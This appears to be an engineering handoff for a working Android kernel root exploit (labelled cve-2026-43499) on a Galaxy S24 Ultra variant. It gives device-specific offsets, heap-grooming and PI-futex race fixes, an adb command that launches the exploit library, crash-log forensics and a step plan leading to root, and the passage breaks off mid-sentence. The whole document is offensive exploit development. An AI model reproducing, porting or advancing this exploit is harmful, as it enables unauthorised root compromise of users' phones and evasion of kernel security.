# S9280 (SM-S9280 / e3q-S9280ZCS6DZF2) Exploit Debugging Handoff

## Device Info

- Model: SM-S9280 (Galaxy S24 Ultra, China)
- SoC: Snapdragon 8 Gen 3 (E3Q platform)
- Firmware: `BP4A.251205.006/S9280ZCS6DZF2`
- Kernel: `6.1.145-android14-11-3254743-abS9280ZCS6DZF2`
- Android: 16, Security Patch: 2026-05-05
- ADB: shell (uid=2000), no root

## Target Header

`src/targets/e3q-S9280ZCS6DZF2/target.h` — fully populated from device BTF and vmlinux.elf.

Key differences from S928U (`e3q-S928USQS6DZF2`):
- `KMALLOC_CACHES_OFF`: `0x0176cbb8` (S928U: `0x0176c6f8`, delta +0x4c0)
- `SLIDE_NFULNL_LOGGER_OFF`: `0x016a65c5` (S928U: `0x016a61b8`)
- All other offsets identical

## Fixes Applied (with evidence)

### 1. MM_STRUCT_SZ: 0x500 -> 0x3c0

**File**: `src/targets/e3q-S9280ZCS6DZF2/target.h:23`

BTF reports `sizeof(struct mm_struct) = 960 (0x3c0)`. The default `0x500` was wrong.

**Effect**: KernelSnitch mm_struct leak success rate improved from ~10% to ~60%.

### 2. MM_STRUCT_SLAB_SZ: new constant 0x400

**Files**: `src/common.h:64-66`, `src/targets/e3q-S9280ZCS6DZF2/target.h:25`

SLUB rounds mm_struct to kmalloc-1k. Device slabinfo confirms:
```
mm_struct  1000  1160  1024  32  8 : tunables 0 0 0 : slabdata 38 38 0
```
`obj_size=1024 (0x400)`, `objs_per_slab=32`.

Previously `mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ = 32768/960 = 34` (wrong).
Now `mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SLAB_SZ = 32768/1024 = 32` (correct).

**Used in**: `src/util.c:746`, `src/pipe.c:131`

### 3. fops.c fd_set PSELECT_WORD_SHIFT support

**File**: `src/fops.c:77-128`

`prepare_pselect_fdsets()` was hardcoded for shift=0 layout. Rewrote to use
`fops_fdset_put_global()` which maps waiter words through `SLIDE_PSELECT_WORD_SHIFT`.

S9280 uses `SLIDE_PSELECT_WORD_SHIFT=3` (same as S928U, confirmed by identical
`__arm64_sys_pselect6` and `core_sys_select` stack frame layouts).

### 4. SKB_RECLAIM_SENDS and MM_DRAIN_TRIGGERS tuning

**File**: `src/targets/e3q-S9280ZCS6DZF2/target.h:27-29`

Changed from defaults (4 sends, 32 drains) to S928U hardware-tested baseline:
- `SKB_RECLAIM_SENDS = 28`
- `APP_SLIDE_RECLAIM_SENDS = 28`
- `MM_DRAIN_TRIGGERS = 2`

### 5. Pipe fill before pselect (CRITICAL FIX)

**File**: `src/fops.c:174-184`

**Problem**: `pselect()` returned `ret=37` immediately because pipe write-end fds
in the `out` fd_set were always writable (pipe empty). pselect never blocked,
so the stale rt_mutex waiter window never opened, and `consumer` never ran
(`calls=0`).

**Fix**: Fill the pipe to capacity (65536 bytes) before calling pselect. This
makes write-end fds not writable, forcing pselect to block.

**Result**: `ret=37 calls=0` -> `ret=4 calls=1 success=1`. pselect now blocks
and PI boost wakes it up.

### 6. Consumer completion wait

**File**: `src/fops.c:203-216`

**Problem**: `consumer` thread runs on a different core. `pselect()` returns
before `consumer` finishes `sched_setattr`, so `consumer_success` reads 0
even though `sched_setattr` eventually succeeds.

**Fix**: Bounded 200ms wait loop after `pselect()` returns, polling
`consumer_calls` until non-zero.

### 7. prepare_ctx cleanup before sk_buff sends

**File**: `src/util.c:907-921`

**Problem**: `prepare_ctx` children (holding mm_struct references) were cleaned
up AFTER `sk_buff` reclaim sends. The target slab page could not return to the
buddy allocator because its objects were still pinned.

**Fix**: Moved `prepare_ctx` cleanup (close memfds + kill children) to BEFORE
the `sendmsg()` reclaim loop.

### 8. Consumer diagnostic logging

**File**: `src/main.c:123-127`

Added `pr_info` after consumer sequence completes, showing `calls`, `success`,
and `tid`. This revealed that `sched_setattr` succeeds but pselect reads
`success=0` due to the race (fixed by #6).

### 9. KernelSnitch bruteforce stride: MM_STRUCT_SZ -> MM_STRUCT_SLAB_SZ (MAJOR)

**Files**: `src/util.c` (`setup_kernelsnitch`, `prepare_kernel_page`)

**Root cause**: The bruteforce scanned mm_struct candidates at
`mm_struct_sz = 0x3c0` stride, but SLUB lays objects out at
`obj_size = 0x400` stride (see fix #2). A candidate matches a real object only
where `lcm(0x3c0, 0x400)` coincides: slab offsets `0x0`, `0x3c00`, `0x7800`
(slots 0, 15, 30). Only 3 of 32 slots were detectable, which explains the
~60% leak rate in the root-umh path and the 24/24 failures elsewhere.

**Effect**: Both the mm_struct leak and the pipe-buffer page leak now succeed
on essentially every attempt (observed object_index values 0, 8, 9, 10, 16,
17, 31 across runs). This is a generic bug that also affects the S928U target.

### 10. Pipe page child lifecycle aligned with prepare_kernel_page

**File**: `src/pipe.c` (`prepare_pipe_buffer_page_child`)

**Problem**: The app variant failed 24/24 with
`pipe KernelSnitch sk_buff page leak failed`. The function used
`clone_memfd()` (clone + open memfd + kill immediately), so all pre/spray/post
children were dead before collision finding, unlike the working root-umh path
which keeps children alive (paused) through setup and bruteforce.

**Fix**: Clone live children, open their memfds, and reap them only after the
bruteforce, mirroring `prepare_kernel_page`. Also moved
`run_kernelsnitch_bruteforce()` to right after `waitpid(leak_child)`, before
the mass memfd frees and sk_buff sends (same position as the working path).

### 11. pr_error exits: diagnostics after pr_error were dead code

**Files**: `src/kernelsnitch/utils.h` (definition), `src/slide_app.c`

`pr_error` ends with `exit(-1)`; the compiler eliminates anything after it.
The `P0_ORACLE_GATE_DIAG` post-failure gate verification placed after
`slide_trigger_physical_slot()` fails never executed (the process had already
exited inside the pr_error in `slide_trigger_physical_slot`). The hook now
runs inside `slide_trigger_physical_slot` before the pr_error.

### 12. Runtime tuning knobs (avoid rebuilds during sweeps)

**Files**: `src/util.c`, `src/pipe.c`, `src/main.c`, `src/slide_app.c`,
`src/common.h`

- `KSNITCH_DEFAULT_PROFILE=1`: skip the reduced app KernelSnitch profile
  (2048/64/8) and keep the library default (4096/128/8).
- `SKB_RECLAIM_SENDS`, `MM_DRAIN_TRIGGERS`: override the reclaim spray
  parameters at runtime.
- `EXPLOIT_CORE`: override the exploit CPU pin (`pin_to_core(CORE)` call
  sites now go through `exploit_core()`).
- `SLIDE_CONSUMER_BURST` / `SLIDE_CONSUMER_SPACING_USEC`: fire multiple
  staggered `sched_setattr` calls per route instead of one.
- `slide cmp_requeue_pi ret=... errno=... polls=...` logging added to the
  app trigger path (previously only the leak path logged it).

### 13. Gate diagnostic continues past tee/read failures

**File**: `src/pipe.c` (`verify_p0_pipe_oracle_gate`)

A `tee()` EFAULT on a freshly filled reclaim pipe is itself a signal (the
kernel write may have touched that `pipe_buffer`). The gate check used to
abort the whole 240-pipe scan on the first failure — observed in practice:
`p0 gate tee failed pipe=33 errno=14` ended the scan after 33 pipes. It
now counts `tee_failures`, logs `p0 gate read failed` separately, scans
all pipes, and keeps references alive (`spawn_p0_ref_keeper`) whenever any
anomaly (hit / changed / tee failure) is seen.

### 14. pselect copy-back dump on write-window fires

**File**: `src/slide_app.c` (`slide_pselect_stack_copy`)

When pselect returns `ret != 0` (a fire), dump every nonzero word of the
returned `in`/`out`/`ex` fd_sets (`slide pselect copyback set=... word=...
value=...`). The kernel copies back `ceil(nfds/64)*8` bytes (40 B = 5 words
at nfds=320) from the `res_*` halves of `stack_fds`, so whatever the walk
changed on the kernel stack shows up here as ready bits. This pinpoints
*where* the write landed on the stack — distinguishing "walk modified the
stale waiter node" from "stray write hit the res sets" — and the bit offset
relative to the waiter node identifies what wrote there.

### 15. Gate marker offset must account for the -0x1000 frag delta

**File**: `src/targets/e3q-S9280ZCS6DZF2/target.h`
(`P0_ORACLE_GATE_PAGE_OFF` 0x0e80 -> 0x1e80)

The 64 KiB reclaim send maps source offset `S` to kernel address
`(base - 0x1000) + S` when the first order-3 fragment lands on the freed
block: the fragment carries payload indices `[0x1000, 0x9000)`, and the
designed offsets confirm the model — `SLIDE_BANK_TASK_OFF=0x1000` lands at
`base+0`, `SLIDE_BANK_LOCK_OFF=0x5200` at `base+0x4200`. The gate write
targets `pipe_buffer->page = direct_to_page(base)` = fragment page 0, so
the pipe read-back shows payload indices `[0x1000, 0x2000)` only. The
marker at 0x0e80 landed at `base - 0x180` (skb head territory) and could
NEVER appear in the read-back — consistent with "oracle never flips" on
both S9280 and S928U. 0x1e80 keeps the intended "0xe80 into page 0".
Note: the other targets (incl. S928U) still carry 0x0e80 and very likely
share the same bug — not changed here (minimal diff), verify before porting.

## Stack Layout Verification (disassembly)

**File**: `s9280-port/vmlinux.elf` (exact S9280ZCS6DZF2 kernel)

`__arm64_sys_pselect6`: `sub sp, #0x90` then `bl core_sys_select`.
`core_sys_select`: `sub sp, #0x1c0`; for nfds=320 (per-set bytes 0x28 < 0x2b)
the on-stack branch is taken with `stack_fds = sp + 0x50` (zeroed region
`sp+0x50..sp+0x140`, six 0x28-byte buffers).

With `E` = SP at `__arm64_sys_pselect6` entry: `stack_fds = E - 0x90 - 0x1c0 +
0x50 = E - 0x200` — byte-identical to the S928U record. The stale waiter at
`E - 0x1e8` is therefore `stack_fds + 0x18` = global word 3, and
`waiter->lock` (waiter + 0x38) = `stack_fds + 0x50` = ex-set word 0 = global
word 10 = `shift + 7`. **SLIDE_PSELECT_WORD_SHIFT=3 is confirmed for S9280 by
disassembly, matching S928U's panic readback.**

## Current Blocking Point

### PI chain walk rarely reaches the stale waiter (write window ~1/10, delay-insensitive so far)

**Location**: `src/slide_app.c` (`slide_pselect_stack_copy`), `src/fops.c`
(`do_pselect_fake_lock_route`)

**Confirmed working on S9280 (new evidence, 2026-07-31)**:

- `FUTEX_CMP_REQUEUE_PI` returns `-1 errno=35 (EDEADLK)` at `polls=1` — the
  PI deadlock setup (the bug precondition) reproduces on this device.
- `slide wait_requeue_pi ret=-1 errno=110 (ETIMEDOUT)` — the waiter stays
  blocked for the full 50 ms, consistent with the EDEADLK stale-waiter state.
- pselect stack layout / shift=3 verified by vmlinux disassembly (see above).
- **Later consumer delays — mixed evidence, no clear win**: with
  `SLIDE_ENTER_DELAY_USEC=70000`, run 1 fired on attempt 1 (`ret=2
  elapsed_usec=100172`, `p0 physical write status=0 ok=1`) and attempt 2
  panicked; run 2 fired 0/3 clean then panicked on attempt 4. But run 3
  fired **0/19** at the same 70 ms setting. Overall fire rate remains low
  (~3-4 fires in ~30 attempts) and so far looks delay-insensitive; the
  early "70 ms is much better" impression was small-sample luck.
- **First write-side signal**: in the one clean fire, pipe 33 then failed
  gate `tee()` with `errno=14 (EFAULT)` — an anomaly never seen in runs
  where the walk did not fire (`tee_failures=0` across all 240 pipes in
  every closed-window attempt). Weak evidence the write lands near pipe
  buffers, but the `RMG-P0-ORACLE-GATE` marker was not read back (the scan
  aborted at pipe 33 before fix #13; re-measurement in progress).
- **Run 4 clean fire, zero pipe anomalies**: attempt 16 fired (`ret=2
  elapsed_usec=100170`, `write ok=1`) and the improved gate scan found
  `hits=0 changed=0 tee_failures=0` across all 240 pipes — the rb write did
  NOT touch any oracle pipe. Combined with run 1, the pipe-33 EFAULT looks
  like a fluke, not the write.
- **All fires surface at the timeout boundary — but that does NOT prove the
  consumer is irrelevant**: every observed `ret=2` has
  `elapsed_usec≈100170` (the full 100 ms pselect timeout), identical to
  non-fire samples, across consumer delays of 15-100 ms. However, a stray
  write into the `res_*` halves of `stack_fds` at sched_setattr time would
  also only become visible at copy-out (nothing wakes do_select early — the
  monitored timerfd never becomes readable), so `elapsed` cannot
  discriminate *when* the walk fired. The measured fire RATE is
  delay-insensitive (0/19 at 70 ms in one run, ~1/10 overall), which is the
  stronger evidence that the consumer delay does not control the fire.
- **root-umh variant reproduces the same blocker** (2026-07-31, post fix
  #9): attempt 1 completed the full chain (tracefs KASLR ✓, mm leak ✓,
  sends 28/28 ✓, page prepare ✓, consumer sched_setattr ✓) and failed with
  `cfi misc_fops mismatch ret=0 target=ffffff80024fb5b0 read=0
  want=ffffff8923899000` — pselect `ret=0`, walk never fired, no write, no
  panic. Both routes bottleneck at walk-fire + payload placement.
- **sk_buff send cap**: `SKB_RECLAIM_SENDS=64` yields `sends=32/64` — the
  1 MiB `SO_SNDBUF` on the reclaim socket caps effective sends at ~32
  (~32 KiB charged per 64 KiB send under unix stream accounting). Raising
  the env knob beyond 32 buys nothing; more coverage needs a bigger
  `SO_SNDBUF`, not more sends.
- **SKB_SNDBUF knob works**: with `SKB_SNDBUF=4194304` (wmem_max=16 MiB on
  this device) sends reach `126/128` (~4 MiB spray). Panics still occur on
  walk fires even at 4 MiB coverage (first panic after 8 attempts vs ~4 at
  1 MiB), so coverage alone does not reliably place the payload at
  `payload_base` — either the freed block is grabbed by a non-frag
  allocation, or the panic is inherent to the erase design (the
  rb_erase_cached leftmost fixup writes `slide_oracle_parent`-derived
  pointers into the REAL `f_pi_target->waiters.rb_leftmost` /
  `task->pi_waiters.rb_leftmost`, and the follow-up top-waiter read can
  deref garbage even when the payload page is placed perfectly).

**Symptom (15-50 ms delays)**: In ~11/12 samples, pselect returns `ret=0`
after the full timeout (`elapsed_usec≈100170`) with `calls=1 sched_ok=1`.
The consumer's `sched_setattr` succeeds but the PI chain walk does not reach
the stale waiter during the pselect window.

**Interpretation**: At `sched_setattr` time the pselect task's
`pi_blocked_on` is usually already clear (or the waiter was dequeued), so
`rt_mutex_adjust_prio_chain` has no chain to walk. Fires cluster near the
~100 ms timeout boundary when they do happen, but forcing 70 ms delays did
NOT reproducibly raise the rate (0/19 in run 3). When the walk fires while
the payload page was not reclaimed (garbage `fake_lock`), the kernel
panics: multiple device reboots observed, including with
`SLIDE_CONSUMER_BURST>=2`. Panics now dominate the failure modes — reclaim
placement, not window rate, is becoming the bottleneck.

**This supersedes the earlier "cfi misc_fops mismatch: pread ret=0"
blocking point**: with fixes #9-#11 the leak stages are now reliable and the
app variant's P0 pipe oracle gives a direct reclaim+write measurement. The
remaining problem is confirming *what* the write hits when it fires (gate
marker vs. corrupted pipe_buffer vs. wrong page), with a correctly reclaimed
payload page. **Update (2026-07-31): answered by the KP #37 crash log — the
write lands in page-allocator metadata as a physmap VA, i.e. the target
address computation is wrong; see "Kernel Crash Log & ftrace Analysis"
below.**

### Previous blocking point (kept for reference)

The rb_tree write mechanism relies on `rb_erase` performing
`rb_set_parent_color(child=target, parent, color)`, i.e. writing the payload
pointer into the target:
- FOPS route: `rb_erase(fake_w0->pi_tree_entry)` with
  `parent = fake_fops`, `right = data_addr(ASHMEM_MISC_FOPS)`, `left = 0`.
- App gate route: `rb_erase(stale_waiter->tree_entry)` with
  `parent = slide_oracle_parent = direct_to_page(payload_base)`,
  `left = slide_oracle_target` (pipe_buffer address), `right = 0`.
Both need (1) the stale waiter linked in `f_pi_target`'s wait tree with
`pi_blocked_on` set, (2) sk_buff coverage of the payload page, (3) the walk
triggered by `sched_setattr` while pselect blocks.

## What Works

| Stage | Status | Evidence |
|-------|--------|----------|
| KASLR leak (tracefs) | Works | `slide-kaslr-ok base=ffffffc0080d0000` |
| KernelSnitch mm_struct leak | ~100% (was ~60%) | fix #9; leaked indices 0..31 |
| Pipe-buffer page leak (app) | ~100% (was 0/24) | fixes #9, #10 |
| sk_buff reclaim sends | 28/28 sent | `sk_buff reclaim sends=28/28` |
| pselect blocking | Works | `ret=0` after full timeout |
| FUTEX CMP_REQUEUE_PI EDEADLK | Works | `ret=-1 errno=35 polls=1` |
| WAIT_REQUEUE_PI timeout | Works | `ret=-1 errno=110` |
| consumer sched_setattr | Works | `calls=1 sched_ok=1` |
| pselect stack layout / shift=3 | Verified | vmlinux disassembly (see above) |
| PI walk reaching stale waiter | ~1/10 at burst=1, delay-insensitive; **burst=3 fires attempt ~1 reliably & safely** | 1 clean fire + 2 panics in ~30 samples at 70 ms; 0/19 in run 3; ftrace run 2 clean fire |
| rb write to target (gate/fops) | **Fires but lands WRONG** (page metadata, not pipe_buffer) | `gate hits=0 changed=0` on all clean fires; KP #37 stack: physmap VA written into struct page lru (see crash log section) |

## Next Steps for the Next Person

The leak stages are reliable (see What Works). The blocker is the PI chain
walk: fire rate ~1/10 (delay-insensitive — the 60-100 ms delay sweep was
done and showed no effect), and most fires end in a kernel panic before any
measurement. Ordered plan:

### Priority 1: Validate the gate marker fix (#15) on clean fires

Run an automated loop (marker 0x1e80, 4 MiB sndbuf, 128 sends). To raise
the ~1/10 walk-fire rate, burst the consumer sched_setattr three times
per pselect window (60/75/90 ms); each call re-tests the dangling
`pi_blocked_on` independently:

```sh
adb shell "P0_ORACLE_GATE_DIAG=1 SKB_SNDBUF=4194304 SKB_RECLAIM_SENDS=128 \
  SLIDE_ENTER_DELAY_USEC=60000 SLIDE_CONSUMER_BURST=3 \
  SLIDE_CONSUMER_SPACING_USEC=15000 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app-dbg.so /system/bin/id"
```

- `p0 gate marker pipe=N` / `gate hits=1`: reclaim + write chain fully
  works → go to Priority 4.
- Clean fire with `hits=0` across all 240 pipes: the write target/page is
  still wrong — re-derive `pipebuf_page_base` placement or the rb target.
- Only panics: go to Priority 2/3.

### Priority 2: Owner-unlock trigger (implemented as fix #16, testing)

The consumer's `sched_setattr` only walks the chain when the pselect task's
`pi_blocked_on` survived (racy, ~1/10). The owner-unlock trigger does not
depend on `pi_blocked_on` at all: with `SLIDE_OWNER_UNLOCK=1`, the owner
thread `FUTEX_UNLOCK_PI`s `f_pi_target` on command (signalled by the
consumer via `slide_owner_unlock_go` instead of calling `sched_setattr`) —
`rt_mutex_slowunlock` dequeues the top waiter, which is the stale waiter
whenever it is still linked (the CVE condition), running
`rb_erase(stale->tree_entry)` = the write. See `slide_owner_thread` /
consumer burst loop in `src/slide_app.c`.
Caveat: the unlock path also wakes the dequeued waiter (`wake_q` on
`fake_task`), so the payload's fake task fields must survive a wakeup —
`try_to_wake_up(fake_task)` returns early when state==0 (TASK_RUNNING),
which the zeroed payload satisfies. Watch for `slide owner unlock_pi
ret=0` + `write status=0 ok=1` in the first test runs; if unlock returns
an error or mislocks, adjust from the errno.

**First owner-unlock test (2026-07-31, delay=70 ms, 24 attempts, 0 panics)**:
`unlock_pi ret=0` on every attempt — the unlock path itself is safe (no
panic, no mislock). But `write status=256 ok=0` everywhere with
`pselect ret=0`, `gate hits=0 changed=0 tee_failures=0` across all 240
pipes, and EDEADLK/ETIMEDOUT still reproducing (`errno=35 polls=1`,
`errno=110`). The completely clean pipe scan means the rb write did NOT
fire (a fired write would redirect `pipe_buffer->page` and change the
gate read-back even when the reclaim missed). Second test with
`SLIDE_ENTER_DELAY_USEC=5000` (unlock ~10 ms after the waiter's 50 ms
timeout) showed the same — timing is not the variable.

**Conclusion (fix #16 dead end, 2026-07-31)**: the owner-unlock trigger
cannot work for this bug shape. The EDEADLK requeue failure leaves the
waiter genuinely blocked on `f_pi_target`'s rt_mutex until its 50 ms
timeout; the timeout cleanup removes the node from `lock->waiters`, so
by the time the waiter has re-armed the freed stack frame via pselect
(any pselect time), the owner unlock finds an empty tree and no-ops.
The sched_setattr fires instead go through the waiter's dangling
`pi_blocked_on` residue (~10 % race: the cleanup sometimes leaves it
pointing at the freed stack frame) and `rt_mutex_adjust_prio_chain`
erases/reinserts the ARMED `tree_entry`/`pi_tree_entry` nodes regardless
of actual tree membership — the write does not require the node to be in
any tree at all. Owner unlock requires exactly that membership. The
`SLIDE_OWNER_UNLOCK` code stays (env-gated, harmless) but the route is
abandoned; the ~1/10 sched_setattr walk remains the only trigger.

### Priority 3: If panics persist with correct placement, re-derive erase params

Hypothesis: even with the payload page placed perfectly, the erase can
panic via `rb_erase_cached`'s leftmost fixup, which writes
`slide_oracle_parent`-derived pointers into the REAL
`f_pi_target->waiters.rb_leftmost` / `task->pi_waiters.rb_leftmost`;
the follow-up top-waiter read may deref garbage. If clean-fire data shows
the payload IS placed (gate hit or copyback consistent) yet panics follow,
redesign the fake rb node so the leftmost fixup writes into payload
memory (e.g. point `parent` at a payload rb_node, or arrange a right
child so the successor path stays inside the payload).

### Priority 4: After a gate hit, run WITHOUT the diag gate

`P0_ORACLE_GATE_DIAG=1` forces `slide_leak_physical_base()` to return 0
right after the gate check (`src/slide_app.c:750`) — diag mode can never
proceed to root. Once `hits=1` is observed, re-run without
`P0_ORACLE_GATE_DIAG`; the flow continues: `app_publish_p0_dirty()` ->
probe slot -> `scan_p0_pipe_oracle()` -> restore -> fops write -> root.

Kernel panics (device reboots) are an inherent cost of these scans — run
long sweeps in the background, write logs to files, and expect adb to drop
for ~60-90 s per reboot. If `adb devices` suddenly shows an empty list
while the device is actually up, restart the adb server
(`adb kill-server`) — but never while a scan is running, it kills the
active shell session too.

## Kernel Crash Log & ftrace Analysis (2026-07-31)

### Crash log sources that actually work (shell-readable)

| Source | Content | Verdict |
|--------|---------|---------|
| `/data/log/prev_dump.log` | dumpstate capture of the PREVIOUS boot, incl. `LAST KMSG (/proc/reset_klog)` with the **full kernel panic stack + all-CPU register dumps** | **Use this.** Re-captured every boot; pull after every panic |
| `/data/log/power_off_reset_reason.txt` | One line per boot: reset type (`RP`/`KP`/`NP`) + panic PC/LR signature for every kernel panic (26 so far) | Panic census without pulling full dumps |
| `dumpsys dropbox` `SYSTEM_LAST_KMSG_*_KP` | XBL/ABL bootloader log only, no kernel stack | Useless for panics |
| `/data/log/dumpstate_lastkmsg_*.log.gz` | same as dropbox | Useless |
| `/sys/fs/pstore`, `/proc/last_kmsg`, `/proc/kallsyms`, `dmesg` | — | All denied for shell |
| `dumpsys dropbox` `SYSTEM_TOMBSTONE` | userspace crashes only (KernelSU probes SIGSYS, one Immich SIGSEGV) | No exploit-process tombstones (process exits cleanly) |

`/data/log` is broadly shell-readable (dropbox.txt, ewlogd, ...). Pull:
`adb pull /data/log/prev_dump.log` (overwritten each boot — pull before the
next panic or it rotates).

### burst=3 + ftrace run 2 (`/tmp/traced-run2.log`, fix #15 marker 0x1e80)

- `SLIDE_CONSUMER_BURST=3 SPACING=15000 ENTER_DELAY=60000`: attempt 1 fired
  cleanly (`pselect ret=2 elapsed=100651 calls=3 sched_ok=3`) and the
  pselect copy-back dump (`src/slide_app.c` fix #14) captured two non-zero
  words: `set=in word=3 value=0000000000000001`,
  `set=ex word=1 value=0000000100000000` — direct evidence the walk rewrote
  two stack qwords. `write status=0 ok=1`, slot 0 write 1/1, walk completed
  **without crashing**. burst=3 is safe and nearly always fires attempt 1;
  the earlier "burst causes panics" belief was wrong.
- But `p0 pipe gate hits=0 changed=0 tee_failures=0` — the write still does
  not land on the oracle pipe; fix #15's marker has never been observed.
- ftrace (`sched_switch`/`sched_process_exit`/`sched_pi_setprio` — these
  three event enables + `trace`/`tracing_on`/`trace_pipe` ARE shell-writable;
  kprobe_events/current_tracer/lock events are SELinux-denied): all exploit
  threads exited cleanly ~0.3 s before the panic; the kernel died at
  285.03 s (dropbox KP #37 13:00). `sched_pi_setprio` only fires for binder
  (2 events system-wide); our SCHED_BATCH+nice sched_setattr produces none.
- Capture recipe: clear `trace` -> enable events ->
  `(nohup cat /sys/kernel/tracing/trace_pipe > /data/local/tmp/trace-cap.txt &)`
  -> run exploit -> after reboot grep on-device then `adb pull` (~300 MB raw;
  pull from `$HOME`, Windows adb cannot write `/tmp`).

### KP #37 full stack (from prev_dump.log) — the key evidence

```
HeapTaskDaemon pid 2940 (system_server GC thread), madvise path:
  __list_del_entry_valid+0xbc/0xd4   (kernel BUG at lib/list_debug.c:61)
  release_pages+0x308  <- free_pages_and_swap_cache <- tlb_finish_mmu
  <- zap_page_range_single <- do_madvise
list_del corruption. prev->next should be fffffffe23266a08,
  but was ffffff88078d0800. (prev=fffffffe22647408)
```

- The corrupted object is a **`struct page` lru linkage in vmemmap**
  (`0xfffffffe...`); the value written into it, `0xffffff88078d0800`, is a
  **physmap linear-map VA** (phys `0x78d0800`) — exactly the shape of a
  `direct_to_page`/`phys_to_virt`-style payload address. The rb write is
  landing in page-allocator metadata, not on the pipe_buffer page. This is
  the hard proof behind `gate hits=0`: **write placement / address
  computation is wrong (suspected vmemmap-vs-physmap confusion in
  `slide_oracle_target`/`slide_oracle_parent`), not a timing problem**.
- At panic time our `id` process (pid 14000) was still alive on CPU0, inside
  `clone -> copy_mm -> __vm_enough_memory` (forking the next attempt). So
  the refined panic model is **misdirected write + innocent-bystander
  detonation**: the stray write lands on a random `struct page`, and
  whichever unrelated process next touches it (here: GC madvise freeing
  pages) takes the BUG. Explains both "22 attempts no panic" (writes miss
  anything hot) and "fire -> panic shortly after, timing varies".
- Other call traces in the same log are benign: kswapd0 GFP_NOIO alloc
  failure at boot (possibly our 4 MiB SKB spray pressure), binder/
  wpa_supplicant `__rtnl_unlock` slow warnings (WiFi driver).

### Panic signature census (26 KPs, power_off_reset_reason.txt)

- **17x** `_raw_spin_trylock+0x1c/0xa4`, LR `0xXXXXXXXX092X284c` — upper 32
  bits clobbered randomly, lower bits are kernel text (~`0xffffffc009XX284c`).
  Meaning: spin_lock on a corrupted/freed object.
- **4x** `rt_mutex_adjust_prio_chain` (+0x1ec/+0x26c/+0x4a4/+0x858) — the
  walk itself tripping on the stale PI chain (also 2x on 2026-07-08, RWC
  11/12, early experiments).
- **3x** `__list_del_entry_valid+0xbc` (DEBUG_LIST) — incl. KP #37 above.

To get register-level context for the rt_mutex_adjust_prio_chain variant,
trigger one more panic of that type and pull `prev_dump.log` — x19-x23 in
the dump are the chain pointers and can be compared directly against the
armed-node layout (`src/slide_app.c:162-234`, `prepare_slide_pselect_fdsets`).

### Refined model & immediate follow-ups

1. Correlate copy-back `in word=3` / `ex word=1` with the armed-node layout
   (shift=3 word table) to compute which two stack qwords rb_erase actually
   rewrote — should reveal the target/parent offset error.
2. Re-audit `slide_oracle_target` (= pipebuf page base + GATE_OBJECT_INDEX *
   PIPE_OBJECT_SIZE) and `slide_oracle_parent` (= direct_to_page(payload)):
   the KP #37 write value being a physmap VA inside vmemmap metadata says at
   least one of the two computations picks the wrong mapping class.
3. After any further panic: `adb pull /data/log/prev_dump.log` FIRST (it
   rotates each boot), then check `power_off_reset_reason.txt` tail.

### Walk disassembly (vmlinux.elf, exact crash-site mapping)

`rt_mutex_adjust_prio_chain` @ `0xffffffc00912271c` (size 0x91c),
`_raw_spin_trylock` @ `0xffffffc0091244ac` (0xa4).

- Struct offsets confirmed: `task->pi_lock` = +0x924, `task->pi_blocked_on`
  = +0x950, `task->prio` = +0x84; `waiter->lock` = +0x38, `waiter->prio` =
  +0x44; LEGACY `rt_mutex_waiter` (tree_entry @0, pi_tree_entry @0x18).
- `+0x124..+0x130`: `x24 = waiter->lock; bl _raw_spin_trylock` — the very
  first lock op of the walk. **All 17 `_raw_spin_trylock+0x1c` panics are
  this site with `waiter->lock == 0`** (KP #39 full regs: x0=0, x24=0,
  x25=0xffffffc0561bbc38 = stale waiter on the waiter thread's kernel
  stack, panicking thread = our own consumer inside `sched_setattr`).
  The reset-reason log's "garbage LR" (`0xXX4009XX284c`) is just
  nibble-scrambled `rt_mutex_adjust_prio_chain+0x130` = `...091228 4c`.
- `+0x1ec`: `ldr x8, [x27, #0x38]` with `x27 = lock->waiters.rb_node` —
  crashes when the waiters tree root is garbage (dead-frame shots).
- `+0x134..+0x150`: trylock-fail retry loop (unlock pi_lock, yield, relock,
  re-read `pi_blocked_on`).
- `+0x220`: `rb_erase(waiter->tree_entry, lock->waiters)` = the write.
- `+0x858`: sanity BUG when top waiter's lock != current lock.

### Futex-side stack geometry re-verified on S9280

Chain: `__arm64_sys_futex` (sub sp,#0x70) -> `do_futex` (#0x60) ->
`futex_wait_requeue_pi` (#0x1b0). `rt_mutex_init_waiter`'s
`RB_CLEAR_NODE` self-stores place `rt_waiter` at `sp+0x98` =
`E - 0xd0 - 0x1b0 + 0x98` = **E - 0x1e8**, exactly the S928U-derived value
the doc assumed; waiter->lock at `E-0x1e8+0x38` = stack_fds+0x50 = ex word
0 = shift+7. **SLIDE_PSELECT_WORD_SHIFT=3 is now confirmed on BOTH the
pselect and the futex side of the S9280 kernel.**

### Dead-frame shots were the dominant panic source (fixed)

Milestone timestamps (waiter vs consumer, µs from WAIT_REQUEUE_PI entry):
timeout return t≈50.1ms, unlock done +0.6ms, pselect arming +0.8ms — the
waiter arms fast. But consumer burst shots slip badly under load: with
ENTER_DELAY=60ms + spacing=15ms, idx=0 lands at 61ms after arming (inside
the 100 ms window) yet idx=1 landed **354 ms** later (idx=0's
`sched_setattr` itself blocks in-kernel for tens-to-hundreds of ms —
migration/stopper noise or the walk's retry loop on the owner-held
f_pi_target lock; the owner thread never unlocks f_pi_target during the
attempt). Shots after window expiry walk a dead/reused stack frame →
`waiter->lock` reads 0 (cleanup zeroed) or garbage → the 17× trylock(0)
and 4× mid-walk panics.

**Fix (fix #17)**: `slide_pselect_armed` flag set around the pselect6
call; the consumer burst re-checks it before every shot and aborts late
shots. New env knob `SLIDE_PSELECT_TIMEOUT_MS` widens the armed window at
runtime. Result: **first fully panic-free runs** (3/3 and 6/6 attempts, no
reboots). Milestone logging stays in the debug build.

### Refined failure model (2026-07-31, supersedes "post-exit UAF")

1. Trigger = consumer `sched_setattr` walk via the waiter's dangling
   `pi_blocked_on` residue (EDEADLK + 50 ms timeout). Residue survives in
   only ~1/10 attempts (fix #16 conclusion stands) — the real bottleneck.
2. Arming geometry is correct (shift=3 verified both sides); when the
   residue exists and a shot lands in-window, the erase fires with our
   armed values.
3. The erase's write goes to `parent` = struct page of `page_base` and
   `target` = pipe_buffer area. If the skb reclaim missed, `page_base`'s
   page is either idle/buddy (**silent corruption, no gate, no panic** —
   the common case) or live on an LRU (HeapTaskDaemon anon page →
   `__list_del_entry_valid` BUG, the 3 bystander panics). KP #37's
   corruption (physmap VA written into vmemmap `page->lru.next`) matches
